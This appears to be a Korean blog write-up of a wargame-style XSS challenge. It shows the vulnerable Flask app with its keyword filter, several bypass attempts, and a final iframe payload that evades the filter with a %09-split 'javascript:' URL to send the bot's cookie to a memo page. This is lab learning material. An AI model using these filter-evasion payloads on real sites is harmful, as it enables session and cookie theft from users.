---
title: "[2025-07-31] XSS Bypass filtering advanced"
excerpt: "XSS "

categories:
  - Problem
tags:
  - [XSS]

permalink: /Problem/[2025-07-31] XSS Bypass filtering advanced/

toc: true
toc_sticky: true

date: 2025-07-31
last_modified_at: 2025-08-04
---

## 🦥 본문

- app.py

```html
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"

    return text

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)

app.run(host="0.0.0.0", port=8000)

```

기존에 풀었던 XSS 문제와 같은 유형이다. 하지만 필터가 더 업그레이드 됐다.

1. 더블 인코딩으로 인한 우회

```html

<%73cript>l%6Fcation.href="/memo?memo=" + d%6Fcument.cookie</%73cript>
```

Selinum이 자동 인코딩을 하지 않는 다는 점을 이용하여 더블 인코딩을 노렸는 데, 안됐다 

```html
url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}
```

하지만 `urllib.parse.quote()` 에서 인코딩이 된다고 한다.

1. 다음과 같은 3개의 코드를 집어 넣었다

```html
<s%09cript>l%09ocation.href="/memo?memo=" + d%09ocument.cookie</s%09cript>
<iframe src="j\tavascript:l\tocation.href='/memo?memo=' + d\tocument.cookie">
<iframe src="j%09avascript:l%09ocation.href='/memo?memo=' + d%09ocument.cookie">
```

- 첫번째 코드는 태그 자체가 깨져서 HTML 파서가 무시를 한다.
- 두번째 코드와 세번째 코드의 차이
    - 2번째 코드는 HTML이 `<iframe src="j[TAB]avascript">` 로 판단. src 속성에서 탭 문자 포함된 URL은 유효하지 않다고 판단 → 무시 → XSS 실패
    - 3번째 코드는 `<iframe src="j%09avascript">` 로 판단. HTML이 %09를 디코딩 하는 과정에서 탭이라 판단 후 제거 → `javascript:` 복원

### 풀이 및 정답

```html
<iframe src="j%09avascript:l%09ocation.href='/memo?memo=' + d%09ocument.cookie">
```